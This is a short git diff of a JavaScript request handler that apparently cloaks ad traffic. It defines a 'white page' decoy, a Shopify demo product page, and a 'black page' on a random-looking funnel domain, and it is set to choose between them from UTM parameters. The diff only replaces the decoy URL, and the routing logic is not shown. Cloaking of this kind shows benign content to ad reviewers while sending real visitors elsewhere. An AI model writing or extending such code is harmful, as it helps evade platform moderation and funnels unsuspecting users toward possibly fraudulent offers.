@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://la-casa-frida.myshopify.com/collections/handbags-and-totes/products/liebre-baguette-azul-bag";
+    const whitePageURL = "https://spice-addons-demo.myshopify.com/products/mens-brown-leather-jacket";
     const blackPageURL = "https://jsdfuuweriajdhyeqzkaiqw.myfunnelish.com/tt-ss-hh-pp";
   
     // Parse the UTM parameters from the request URL
